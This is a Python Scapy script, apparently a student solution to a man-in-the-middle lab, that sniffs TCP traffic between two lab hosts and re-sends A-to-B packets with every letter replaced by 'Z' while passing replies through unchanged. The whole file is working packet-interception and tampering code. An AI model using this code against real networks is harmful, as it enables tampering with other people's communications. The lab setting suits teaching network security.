#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"


def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:

        # Create a new packet based on the captured one.
        # 根据捕获的数据包创建一个新数据包。
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # 1）我们需要删除IP和TCP头中的校验和，因为我们的修改将使它们无效。
        # Scapy will recalculate them if these fields are missing.
        # 如果缺少这些字段，Scapy将重新计算它们。
        # 2) We also delete the original TCP payload.
        # 2）我们还删除了原始TCP负载。
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        # 基于旧的有效载荷构造新的有效载荷。
        # Students need to implement this part.
        # 学生需要实现这一部分。
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load  # The original payload data 原始有效载荷数据
            data = data.decode()
            newdata=""
            for char in data:
               if ('a' <= char <= 'z') or ('A' <= char <= 'Z'):
                   newdata += 'Z'  
               else:
                   newdata += char  
            send(newpkt/newdata)
        else:
            send(newpkt)
        ################################################################
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # 根据捕获的数据包创建新数据包
        # Do not make any change
        # 不要做任何改变
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

f = 'tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'
pkt = sniff(filter=f, prn=spoof_pkt)
